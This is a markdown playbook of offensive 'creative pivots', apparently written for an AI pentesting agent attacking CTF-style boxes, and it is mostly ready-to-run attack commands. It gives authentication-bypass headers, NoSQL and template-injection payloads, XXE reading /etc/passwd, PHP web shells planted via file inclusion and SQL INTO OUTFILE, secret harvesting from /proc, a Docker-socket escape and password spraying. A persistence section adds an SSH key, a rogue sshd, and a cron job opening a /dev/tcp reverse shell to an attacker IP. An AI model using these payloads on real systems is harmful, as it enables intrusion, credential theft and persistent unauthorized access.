# Creative Pivots

> When the obvious path fails, branch sideways. This is the catalogue of
> "if X failed, try Y" mappings. Built from real engagement post-mortems
> (silentium, AirTouch, WingData, 2million).

The biggest failure mode in our nest isn't lack of skills — it's pattern
narrowness. A model tries hydra, hydra fails, model says "stuck". This
file catalogs the *non-obvious* moves to try **before** declaring stuck.

---

## A. Auth wall: "needs credentials" failures

### A1 — Auth bypass via headers
```bash
# X-Forwarded-For trick (works if app trusts internal traffic)
curl -H "X-Forwarded-For: 127.0.0.1" http://target/admin
curl -H "X-Real-IP: 127.0.0.1" http://target/admin
curl -H "X-Originating-IP: 127.0.0.1" http://target/admin
curl -H "X-Remote-IP: 127.0.0.1" http://target/admin
curl -H "X-Client-IP: 127.0.0.1" http://target/admin

# X-Original-URL / X-Rewrite-URL — bypasses path-based ACLs
curl -H "X-Original-URL: /admin" http://target/
curl -H "X-Rewrite-URL: /admin" http://target/

# Referrer-based ACLs
curl -H "Referer: http://target/admin/" http://target/admin/users

# Custom app-specific bypass headers (read source!)
# Flowise: x-request-from
# Some apps: x-api-key with empty value
# Some apps: trust proxy → set X-Forwarded-Proto
```

### A2 — Account self-creation
- Register with `admin@<target-domain>` → trigger password reset flow.
- Register and check if your role is editable in the JWT or session payload.
- Race condition: parallel POSTs to `/register` may bypass duplicate-email check.

### A3 — Password reset abuse
- Initiate reset for `admin` → check the reset URL pattern.
- IDOR in reset: substitute user_id in the reset payload.
- Token leak: reset URL emitted in HTTP response body (not just email).
- Time-based: many reset tokens are MD5(timestamp) or unix epoch — predictable.

### A4 — Source dive (the big one)
If the app is open-source: `bash scripts/source-dive.sh <repo> <tag>`.
The auth bypass is in the source, not the running app. Read the auth
middleware. Look for `whitelist`, `skipAuth`, `requireAuth=false`,
`isPublic`, `publicEndpoints`, `unauthenticatedPaths`.

### A5 — JSON-vs-form parser confusion
```bash
# Send array values where strings expected
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username[]":"admin","password[]":"x"}'

# Boolean coercion
{"username":"admin","password":true}

# Nested object where string expected (NoSQL injection)
{"username":"admin","password":{"$ne":null}}
{"username":{"$regex":"^a"},"password":{"$regex":"^a"}}
```

### A6 — Method override
```bash
curl -X POST -H "X-HTTP-Method-Override: GET" http://target/admin
curl -X PUT -H "X-Method-Override: GET" http://target/admin
# Apache mod_rewrite quirks
curl -X UNKNOWN http://target/admin    # some servers fail open on unknown verbs
```

### A7 — Path normalization tricks
```bash
curl http://target/admin/                    # original
curl http://target/admin//                   # double slash
curl http://target/admin/.                   # trailing dot
curl http://target/admin/../admin            # path traversal collapse
curl http://target/Admin                     # case (Windows IIS)
curl http://target/ADMIN
curl http://target/admin%20                  # trailing space (URL-encoded)
curl http://target/admin%2f                  # encoded slash
curl http://target/admin/index.php           # explicit index
curl http://target/admin;param=x             # semicolon
```

---

## B. "Brute force isn't finding anything"

Brute force is **last resort**. If it's failing, you skipped steps:

### B1 — Username harvesting before brute force
- `/wp-json/wp/v2/users` (WordPress)
- `?author=N` enumeration (WordPress)
- `/asynchPeople/api/json` (Jenkins)
- `/api/v4/users.json` (GitLab — if anon list enabled)
- `/rest/api/2/user/picker?query=.` (Jira)
- `kerbrute userenum` (AD)
- `enum4linux -a target` (SMB — RID cycling)
- `smtp-user-enum` (SMTP VRFY/EXPN)
- `finger` on port 79 (legacy but still appears)
- Team page / about page → first names
- JS bundles → `grep -oE '"[a-z._-]+@[a-z.-]+"'` for emails
- GitHub commits if the app or a dev linked their account

### B2 — Wordlist choice (don't always use rockyou)
- For company-themed boxes: include the company name + year
- For known domains: `<companyname>2024`, `<companyname>123`, `Welcome1`
- `/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt` is faster and hits the easy ones
- Default credentials list specific to the product

### B3 — Spray vs brute force
**Brute force** = many passwords against one user (locks accounts).
**Spray** = one password against many users (avoids lockout).
For AD always spray, never brute. Hydra has `-l user -P passwords.txt`
for brute and `-L users.txt -p password` for spray.

### B4 — XML-RPC amplification (WordPress)
If `/xmlrpc.php` is open, `system.multicall` lets you try ~1000
passwords per request — way faster than `/wp-login.php`.

### B5 — Asreproast & kerberoast (AD)
Both return crackable hashes WITHOUT trying passwords against the network.
Crack offline at full speed. Always try these before any AD spray.

---

## C. "Web app dir-busts return only the SPA"

When everything returns 200 with the same SPA HTML:

### C1 — Look at the *actual* SPA
```bash
curl -s http://target/ | grep -oE 'src="[^"]+\.js"'
curl -s http://target/static/js/main.*.js > /tmp/bundle.js
grep -oE '/api/v[0-9]+/[a-zA-Z0-9_/-]+' /tmp/bundle.js | sort -u
grep -oE '"[A-Za-z0-9_-]+":\s*"[^"]+"' /tmp/bundle.js | head -50
```

### C2 — Network tab simulation
Open the SPA in the browser, click around, watch Network tab. Every
real API call shows up there. Reproduce them with curl.

### C3 — Source-dive the SPA framework
React/Vue/Svelte apps often have route definitions in JS files.
`grep -RIn "createBrowserRouter\|<Route\|component:" .`

### C4 — robots.txt + sitemap.xml + .well-known
Yes, in 2026, still useful. Especially `/sitemap.xml` for unlinked pages.

---

## D. "Got web access but stuck pre-shell"

### D1 — File upload abuse
Even if the app allows only "images":
- Polyglot files (PHP in EXIF, web shell appended after JPG marker)
- Filename injection: `shell.php.jpg`, `shell.php%00.jpg` (null byte)
- Content-Type tampering: `image/jpeg` on a `.php` file
- Race condition: upload + access between scan/move

### D2 — Local File Inclusion → RCE
- `php://filter/convert.base64-encode/resource=index.php` to read source
- `data://text/plain,<?php system($_GET[c]); ?>`
- Log poisoning: inject PHP into `/var/log/apache2/access.log` then include it
- `/proc/self/environ` if user-controlled (older PHP)

### D3 — Server-Side Template Injection (SSTI)
Always test these in any rendered field:
```
{{7*7}}             → 49 = Jinja/Twig
${7*7}              → 49 = FreeMarker / Spring
<%= 7*7 %>          → 49 = ERB / EJS
#{7*7}              → 49 = Pug / others
{7*7}               → 49 = Smarty (rare)
```
Test in: error messages, search results, profile fields, email previews,
PDF/HTML report generators.

### D4 — Deserialization
Java: `O:8:`, `_$$ND_FUNC$$_`, `rO0AB` (base64 of magic bytes)
PHP: `O:8:"stdClass":` patterns in cookies/params
.NET: `AAEAAAD///` (BinaryFormatter)
Python pickle: `cos\nsystem\n` patterns

### D5 — XML / XXE
Anywhere XML is accepted (SAML, file uploads, SOAP, RSS):
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### D6 — Prototype pollution (Node.js)
Look for `__proto__` or `constructor.prototype` in JSON bodies.
```json
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}
```

### D7 — Mass assignment
Add fields to POST bodies that aren't in the form:
```json
{"username":"x","password":"x","is_admin":true,"role":"admin","verified":true}
```

---

## E0. "I have a hash, hashcat says no candidates"

The single biggest hashcat failure mode is **wrong mode**, not weak wordlist.
If rockyou exhausts on what looks like SHA256 / MD5, **the algorithm is
salted** and you picked the wrong mode.

### Step 1 — Look at the hash length
| Length (chars) | Algorithm | Default mode |
|---|---|---|
| 32 | MD5 | 0 |
| 40 | SHA1 | 100 |
| 56 | SHA224 | 1300 |
| 64 | SHA256 | 1400 |
| 96 | SHA384 | 10800 |
| 128 | SHA512 | 1700 |
| 60 (`$2a$`/`$2b$`) | bcrypt | 3200 |
| starts with `$1$` | MD5-crypt | 500 |
| starts with `$5$` | SHA256-crypt | 7400 |
| starts with `$6$` | SHA512-crypt | 1800 |
| starts with `$y$` | yescrypt | 30000 |
| starts with `$argon2id$` | Argon2id | 19500 |

### Step 2 — Find the salt FIRST (not by trying)
```bash
# Always look at the app's config or source for:
grep -RIniE "(salt|peppe?r)" /opt/<app>/    # config files
grep -RInE "\.salt|salt_string|getSalt" /opt/<app>/  # source code
```
App-specific salt placements:
- **Wing FTP:** `/opt/wftpserver/Data/<domain>/settings.xml` → `<SaltingString>`
- **WordPress:** `wp-config.php` → `AUTH_SALT` etc. (but actual user pwd uses phpass)
- **Drupal:** `settings.php` → `hash_salt`
- **Generic Spring app:** `application.properties` / `.yml` → `spring.security.password.salt`

### Step 3 — SHA256-with-salt mode reference (don't trial-and-error)
| Algorithm | Hashcat mode |
|---|---|
| `sha256(pass)` | 1400 |
| `sha256(pass.salt)` | **1410** ← most common (Wing FTP, many Java apps) |
| `sha256(salt.pass)` | 1420 |
| `sha256(pass.salt.pass)` | 1430 |
| `sha256(salt.pass.salt)` | 1411 |
| `sha256(unicode-le(pass).salt)` | 1450 |
| `sha256(salt.unicode-le(pass))` | 1460 |
| `md5(pass.salt)` | 10 |
| `md5(salt.pass)` | 20 |
| `sha1(pass.salt)` | 110 |
| `sha1(salt.pass)` | 120 |

### Step 4 — Confirm with a one-liner before brute force
```bash
# If you know one user's password (e.g. anonymous = empty), verify the algorithm:
python3 -c "
import hashlib
for combo in ['WingFTP', 'pwWingFTP', 'WingFTPpw']:
    print(combo, hashlib.sha256(combo.encode()).hexdigest())
"
# Match against a known hash. The combo that matches reveals the order.
```

### Step 5 — If hashcat-mode lookup fails, READ THE SOURCE
The app's login function tells you exactly what it does. For Wing FTP it
was literally:
```lua
temppass = user.password..salt_string
password_md5 = sha2(temppass)
```
2 lines that saved 30 minutes of mode-trial-and-error. **Always grep the
login/auth source for `hash`, `sha`, `md5`, `salt`, `digest` before
starting hashcat.**

---

## E. "Got shell but cannot escalate"

### E1 — Don't just run linpeas and stop
linpeas is a checklist, not an answer. Read the output. Check:
- SUID binaries → GTFOBins
- sudo -l → GTFOBins for each entry
- Cron jobs (every minute, run as root, file you can write)
- Capabilities (`getcap -r / 2>/dev/null`)
- World-writable files in `/etc/`
- SSH keys in `/home/*/.ssh/`
- `.bash_history` of every readable user
- `/var/mail/`, `/var/spool/mail/`
- Database connection strings in web app configs

### E2 — Process arguments (the AirTouch lesson)
```bash
ps auxwwf
cat /proc/*/cmdline 2>/dev/null | tr '\0' ' ' | tr '\n' '\n'
grep -aE 'pass|secret|key|token' /proc/*/environ 2>/dev/null
```
People put passwords on command lines — even root processes.

### E3 — Network neighbors (you might be on a multi-host network)
```bash
ip a; ip route
arp -a
ss -tunap                              # local listening services (often more than what's external)
for i in $(seq 1 254); do (ping -c1 -W1 192.168.X.$i &) ; done
```

### E4 — Container escape
- `/.dockerenv` exists → you're in a container
- Mounted Docker socket: `ls -la /var/run/docker.sock` → host root via `docker run -v /:/host`
- `/proc/1/cgroup` reveals containerization
- Capabilities check: `capsh --print`
- Mounts: `mount | grep -v proc`

### E5 — Database → file write → web shell
If the web user has DB access and the DB user has FILE privilege:
```sql
-- MySQL
SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/html/sh.php';
-- PostgreSQL
COPY (SELECT '...') TO '/var/www/html/sh.php';
```

### E6 — Service config files leak service creds
Check `/etc/<service>/`, `/opt/<service>/`, `~/.<service>/` for any
service running on the box. Database creds, API keys, SMTP creds —
all routinely in plaintext config.

---

## F. "Lost access" (the AirTouch lesson)

Before any pivot that could break your shell:

```bash
# 1) Ensure persistence FIRST
echo "<your-pubkey>" >> ~/.ssh/authorized_keys

# 2) Backup connection on a different port (if root)
sudo /usr/sbin/sshd -p 2222 &

# 3) Cron fallback callback
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -c 'bash -i >& /dev/tcp/your-ip/4444 0>&1'") | crontab -

# 4) NOW pivot (WiFi connect, VPN, route change, whatever)
```

If you DO lose access, before reconnecting reconnaissance:
- Check if the box has a known mgmt IP / second NIC you can hit
- Check if the network has DHCP'd you a new IP that lets you back in
- Check if the original SNMP/credential leak is reproducible (reset path)

---

## G. "Stuck on a CTF-like target"

CTF boxes have a "designed path". When you can't find it:

### G1 — Look at the target's *theme*
- Box name → keywords for password lists
- Logo / favicon → company/product fingerprint
- "About" page → team names → username spray
- Comments in HTML → hints

### G2 — Check unusual ports
- 79 (finger), 113 (ident), 135/139/445 (Windows), 161/162 (SNMP),
  389 (LDAP), 873 (rsync), 1433/1521/3306/5432 (databases),
  2049 (NFS), 5060 (SIP), 6379 (Redis), 11211 (Memcached),
  27017 (MongoDB), 50000 (SAP).

### G3 — Look for steg/embedded data
- `strings` on every binary, image, PDF
- `binwalk` on any file > 1MB
- `exiftool` on images (often holds creds in CTFs)
- `zsteg` on PNG/BMP

### G4 — Check the obvious wordlists you skipped
- `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
- `/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt`
- `/usr/share/seclists/Discovery/Web-Content/quickhits.txt`
- `/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt` (for APIs)

---

## H. "Nothing works" — the meta-recovery

When you've truly tried everything obvious:

1. **Re-read your own notes.** Open the report file. Read every command and
   its output. Something is in there you didn't notice.
2. **Re-read the target's main page** with fresh eyes — without preconceptions.
3. **Search for the target by name/CVE/version** — you may be missing public
   knowledge. `scripts/walkthrough-search.sh <target>` for HTB boxes.
4. **Switch tools.** If you used `gobuster`, try `feroxbuster`. If you used
   `hydra`, try `medusa`. Different tools find different bugs.
5. **Take a break / new session.** The model's context window may be
   poisoned with failed assumptions. A clean state often unblocks.

---

## When NOT to use this file

- Don't paste this whole file into your context. Use it as a lookup table
  via `scripts/context-broker.sh creative-pivots`.
- Don't try every pivot in order. Pick the ONE that maps to your current
  blocker (auth? brute? web? shell?) and try it.
- Don't replace the archetype playbooks with this. Archetypes first,
  pivots second.
